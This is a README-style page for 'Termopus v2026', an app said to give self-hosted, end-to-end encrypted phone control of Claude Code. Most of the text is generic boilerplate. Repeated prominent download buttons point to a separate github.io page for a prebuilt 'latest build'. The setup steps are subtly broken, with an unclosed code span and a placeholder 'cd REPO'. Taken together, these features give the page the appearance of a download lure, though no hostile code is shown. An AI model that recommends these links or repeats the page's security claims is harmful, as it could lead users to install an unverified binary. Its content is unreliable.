# Termopus v2026 - mobile remote control app

> **Operate Claude Code from your phone with a self-hosted, end-to-end encrypted app for Android and iOS, built in Flutter for remote access in version 2026.**

[![Platform](https://img.shields.io/badge/Platform-Android/iOS-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/nathanfoster62/termopus-v2026-android-ios?style=flat-square)](https://github.com/nathanfoster62/termopus-v2026-android-ios)

---

<p align="center">
  <a href="https://nathanfoster62.github.io/termopus-v2026-android-ios/">
    <img src="https://img.shields.io/badge/Download-Termopus%20Latest-brightgreen?style=for-the-badge" alt="Download Termopus">
  </a>
</p>

> **[Direct Download - Termopus v2026](https://nathanfoster62.github.io/termopus-v2026-android-ios/)**

---

[Download Latest Build](https://nathanfoster62.github.io/termopus-v2026-android-ios/)

---

## Overview

Termopus is a mobile remote control app made for using Claude Code from Android and iOS devices. It is intended for self-hosted deployments, meaning the connection path runs through infrastructure you control instead of a shared hosted platform.

The stack combines Flutter on the client side with Cloudflare Workers, Durable Objects, WebSocket, mTLS, and Rust. Its design emphasizes encrypted communication and mobile access, making it useful for developers who need to reach Claude Code while away from their workstation.

---

## Key Capabilities

- Remote control for Claude Code from mobile
- Self-hosted deployment approach
- End-to-end encrypted communication
- Flutter-based mobile interface
- Support for Android and iOS
- Cloudflare Workers and Durable Objects integration
- WebSocket-based connectivity
- mTLS-oriented secure transport
- Open-source implementation with Rust included in the stack

---

## Installation

You can clone the repository or download it locally, then follow the structure provided for both the client and hosting parts.

1. Get the source:
   `git clone https://github.com/nathanfoster62/termopus-v2026-android-ios.git
2. Enter the project directory:
   `cd REPO`
3. Build or run the mobile app with your Flutter toolchain and connect it to your self-hosted backend deployment.

If you prefer a release package, download the latest build from the project page and install it on your device or in your test setup.

---

## Usage

1. Bring up your self-hosted Termopus backend.
2. Point the mobile app at the endpoint you deployed.
3. Authenticate the session through the configured secure channel.
4. Use the phone interface to interact with Claude Code remotely.
5. Keep the app and backend in sync when applying feature or security-related updates.

Typical workflow:

- Deploy the Cloudflare and server-side components.
- Open the Flutter app on Android or iOS.
- Confirm that the encrypted connection is active.
- Send remote commands or review activity from your phone.

---

## Configuration

Termopus is built around a self-hosted deployment, so connection details and security parameters are handled through your infrastructure and app settings.

Common configuration areas include:

- Backend endpoint for your deployed service
- WebSocket connection target
- mTLS credentials or certificates
- Encryption-related settings
- Mobile app environment values

Example structure:

    {
      "backendUrl": "https://your-domain.example",
      "webSocketUrl": "wss://your-domain.example/socket",
      "mtlsEnabled": true
    }

Set the values to match your infrastructure and release configuration.

---

## Requirements

- Android or iOS device
- Flutter-compatible development environment for building the app
- A self-hosted backend deployment
- Cloudflare Workers and Durable Objects for the hosted components
- WebSocket support
- mTLS-capable configuration for secure communication
- Rust toolchain where required by the project stack

---

## FAQ

**Is Termopus a hosted service?**  
No. It is designed as a self-hosted architecture.

**Which platforms does it support?**  
The mobile app targets Android and iOS.

**Is communication encrypted?**  
Yes, the setup specifies end-to-end encrypted communication.

**Where are connection settings changed?**  
Adjust the app and backend configuration in your self-hosted deployment and mobile build settings.

**What if the connection does not work?**  
Review your WebSocket endpoint, mTLS configuration, backend deployment status, and any environment values used by the app.

**How are updates handled?**  
Use the newest repository state or release build, then redeploy or rebuild the mobile and backend components as required.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
